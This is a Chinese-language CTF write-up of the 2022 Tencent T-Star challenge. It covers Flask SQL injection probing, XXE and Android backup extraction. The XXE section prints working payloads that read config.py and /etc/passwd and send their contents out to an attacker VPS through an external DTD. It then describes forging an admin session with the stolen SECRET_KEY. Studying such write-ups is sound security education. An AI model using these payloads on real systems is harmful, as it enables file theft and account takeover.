---
title: 2022 未知之境 腾讯网络安全 T-Star 高校挑战赛 WriteUp
contest: 2022 腾讯 T-Star 高校挑战赛 (未知之境)
year: 2022
difficulty: medium
vuln_type: [sqli, xxe, web_unknown, forensic_disk]
tags: [T-Star, 腾讯, Flask, JSON, id注入, XXE, file:///proc/self/cwd/config.py, error SYSTEM, abe.jar, data.ab, Android Backup]
attack_chain: ["Q1 Flask: /api/info?id=1 → 'No such streamer' 提示 SQL 注入", "POST /api/like json={\"id\":\"1\"} 触发 ORM / 拼 SQL", "Q2 XXE: POST /api/like Content-Type: application/xml", "<!ENTITY % x SYSTEM 'file:///etc/passwd'>", "嵌套 OOB XXE: %x → %y → %z → error SYSTEM 'http://vpsip/?p=%x' (base64 数据外带)", "读 /proc/self/cwd/config.py → SECRET_KEY", "伪造 admin session 提权", "Misc: java -jar abe.jar unpack data.ab data.tar yun202203 (Android backup extract)"]
key_payload: "Content-Type: application/xml + OOB XXE to http://vpsip/test.dtd"
one_liner: Flask SQLi + XXE OOB data exfil + Android backup 解包
lesson: Flask session 密钥泄露 + XXE OOB 数据外带是 web 中级标配
quality: high
---

# 2022 未知之境 腾讯 T-Star 高校挑战赛 WP

原文 https://www.ctfiot.com/37683.html

## Web

### Q1: Flask SQLi
```
GET /api/info?id=1
POST /api/like
{"id":"1"}
```
- 错误响应: `{"status": true, "data": {"count": "No such streamer."}}`
- 异常响应: `{"ERROR": "No JSON object could be decoded"}`
- 通过 id 注入点触发 ORM / 拼 SQL

### Q2: XXE
```http
POST /api/like HTTP/1.1
Host: 175.178.148.197:5000
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE message [
  <!ELEMENT message ANY>
  <!ENTITY % x SYSTEM "file:///proc/self/cwd/config.py">
  <!ENTITY % y '
    <!ENTITY &#x25; z "<!ENTITY &#x26;#x25; error SYSTEM &#x27;&#x25;x;&#x27;>">
    &#x25;z;
  '>
  %y;
]>
<message>233</message>
```

**OOB XXE 链：**
1. `%x` 读 `file:///proc/self/cwd/config.py`
2. `%y` 定义 `error` SYSTEM 调用
3. `&#x25;z;` 触发 `error SYSTEM 'http://vpsip/?p=%x;'`
4. 读到的内容作为参数带外发送

**变种（VPS DTD 加载）：**
```xml
<!ENTITY % remote SYSTEM "http://vpsip/test.dtd">
%remote;
%int;
%send;
```

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://vpsip:port/?p=%file;'>">
```

**拿到 SECRET_KEY → 伪造 admin session**

## Misc: Android Backup
```bash
java -jar abe.jar unpack data.ab data.tar yun202203
```
- `abe.jar` = Android Backup Extractor
- `data.ab` = Android Backup 文件
- 解包得 tar

```java
package ctf.misc.step;
public class Step1 {
    public static String FlagStep1 = "175.178.148.197:80";
}
```

## 教学价值
- **Flask** session 是 base64 pickle 签名（用 SECRET_KEY）
- **XXE OOB** 必须有外网 VPS（vpsip）做 data exfiltration
- **`<!ENTITY % ...>` 嵌套** 触发多层解析
- **`file:///`** 协议读本地文件
- **error SYSTEM** 触发 HTTP 请求
- **Android Backup (.ab)** 是 Android 4.x 之后默认启用 ab 格式
- **abe.jar** 第三方 Java 工具

## 工具
- Burp / curl 发送 XML
- VPS 接收外带（python -m http.server）
- Python flask-unsign 伪造 session
- abe.jar (Android Backup Extractor)
- 7z / tar
